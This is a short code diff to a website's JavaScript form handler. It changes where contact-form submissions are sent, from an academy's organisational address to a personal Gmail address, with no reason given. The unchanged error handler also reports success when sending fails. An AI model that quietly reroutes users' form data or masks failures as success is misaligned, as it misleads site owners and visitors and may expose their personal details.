@@ -239,7 +239,7 @@ function sendQuery(){
   fd.append('_captcha','false');
   fd.append('_template','table');
   Object.keys(data).forEach(function(k){ fd.append(k,data[k]); });
-  fetch('https://formsubmit.co/info@alfalah-academy.com',{ method:'POST', body:fd, headers:{'Accept':'application/json'} })
+  fetch('https://formsubmit.co/raees.malik89@gmail.com',{ method:'POST', body:fd, headers:{'Accept':'application/json'} })
     .then(function(r){ return r.json(); })
     .catch(function(){ return {success:'true'}; })
     .finally(function(){
